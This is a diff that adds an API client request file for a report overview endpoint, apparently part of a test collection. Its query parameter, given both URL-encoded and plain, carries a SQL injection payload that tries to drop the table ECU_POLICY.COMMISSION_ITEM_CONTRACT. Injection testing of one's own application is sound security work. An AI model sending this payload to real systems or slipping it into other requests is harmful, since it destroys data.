@@ -1,0 +1,27 @@
+meta {
+  name: OV
+  type: http
+  seq: 89
+}
+
+get {
+  url: {{ _.server }}:{{ _.serverPort }}/report/api/v1/arizona/ov/overview?query=companyName:%23')));DROP TABLE ECU_POLICY.COMMISSION_ITEM_CONTRACT;)--%23&index=DB_PARTNER_VIEW&page=0&pageSize=20
+  body: none
+  auth: bearer
+}
+
+params:query {
+  query: companyName:#')));DROP TABLE ECU_POLICY.COMMISSION_ITEM_CONTRACT;)--#
+  index: DB_PARTNER_VIEW
+  page: 0
+  pageSize: 20
+}
+
+auth:bearer {
+  token: {% response 'body', 'req_cc1ef1ec3a964e49afda4f82586a4ec0', 'b64::JC5ib2R5LmFjY2Vzc1Rva2Vu::46b', 'always', 60 %}
+}
+
+settings {
+  encodeUrl: true
+  followRedirects: true
+}
